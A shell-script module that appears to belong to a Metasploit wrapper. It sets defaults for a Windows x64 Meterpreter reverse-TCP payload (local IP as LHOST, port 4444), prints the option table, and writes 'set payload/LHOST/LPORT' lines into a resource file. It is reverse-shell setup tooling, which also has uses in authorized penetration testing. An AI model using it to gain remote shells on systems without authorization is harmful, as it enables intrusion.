function defaul_payload_options {
	lhost=`ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d'/'`
	lport="4444"
	exitfunc="process"
}
function set_payload {



		if [ "$new_processing_variables" = "lhost" ]; then
		unset lhost
		lhost=$module_set
		elif [ "$new_processing_variables" = "lport" ]; then
		unset lport
		lport="$module_set"
		elif [ "$new_processing_variables" = "exitfunc" ]; then
		unset exitfunc
		exitfunc="$module_set"
		fi
}
function payload {
cat << !
Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  $exitfunc		yes     Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     $lhost   	yes     The listen address
   LPORT     $lport		yes     The listen port

!
}
function payload1 {
cat << !
Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  		Required  Description
   ----      ---------------  		--------  -----------
   EXITFUNC  $exitfunc			  yes     Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     $lhost	  yes     The listen address
   LPORT     $lport			  yes     The listen port

!
}

function payload_run {
path_payload=`pwd`
rc_file="$path_payload/file.rc"
	echo "set payload $payload_OS/$payload_registers/$payload_format/$payload_name" >> $rc_file
	echo "set LHOST $lhost" >> $rc_file
	echo "set LPORT $lport" >> $rc_file
	echo "set EXITFUNC $exitfunc" >> $rc_file
}
